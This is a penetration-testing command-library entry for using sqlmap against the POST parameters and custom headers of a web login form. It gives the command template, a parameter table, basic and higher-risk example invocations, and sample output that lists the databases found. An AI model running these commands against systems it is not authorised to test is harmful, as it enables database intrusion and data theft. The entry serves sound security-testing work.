---
id: 613ca210-785b-4e21-9542-c49f852d3a12
name: sqlmap-post-request-injection
type: command
executor: bash
data: >-
  sqlmap -u "$_URL" --data "$_POST_DATA" --headers="$_CUSTOM_HEADER" --batch
  --dbs
output: null
created_at: '2023-04-06T03:56:36.339078+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - sql-injection
  - sqlmap
  - exploitation
verified: true
validated: true
---

# sqlmap-post-request-injection

## Command

```bash
sqlmap -u "$_URL" --data "$_POST_DATA" --headers="$_CUSTOM_HEADER" --batch --dbs
```

## Description

This command uses SQLMap to test for SQL injection vulnerabilities in POST requests to a web application, targeting specified data parameters and custom headers. It automates detection, DBMS fingerprinting, and database enumeration, ideal for exploiting public-facing web apps during penetration testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Target URL for the POST request (e.g., http://example.com/login) | Yes |
| $_POST_DATA | POST payload as key-value pairs (e.g., username=admin&password=pass) | Yes |
| $_CUSTOM_HEADER | Custom header with injection point (e.g., X-Forwarded-For:127.0.0.1*) where * marks the injectable position | No |
| -u | Specifies the target URL | Built-in |
| --data | Defines POST data to send | Built-in |
| --headers | Adds custom headers for injection testing | Built-in |
| --batch | Runs non-interactively, auto-accepting defaults | Built-in |
| --dbs | Enumerates available databases if injection is found | Built-in |

## Examples

### Basic Usage

```bash
sqlmap -u "http://example.com/login" --data "username=admin&password=pass" --batch --dbs
```

### Advanced Usage

```bash
sqlmap -u "http://example.com/login" --data "username=admin&password=pass" --headers="X-Forwarded-For:127.0.0.1*" --batch --dbs --level=3 --risk=2
```

This increases testing thoroughness with higher level and risk settings.

## Expected Output

Upon successful detection:
```
sqlmap/1.7.5#stable (http://sqlmap.org) - automatic SQL injection and database takeover tool
[...]
[INFO] the back-end DBMS is MySQL
web application technology: PHP
backend DBMS: MySQL >= 5.0 (MariaDB fork)
[INFO] Parameter: X-Forwarded-For (Custom header) is vulnerable
available databases [2]:
[*] information_schema
[*] webapp_db
```

If no vulnerability: "[INFO] all tested parameters appear to be not injectable."

## Related

- [[procedures/SQL-Injection-via-POST-Request-with-SQLMap]]
- [[tools/sqlmap]]
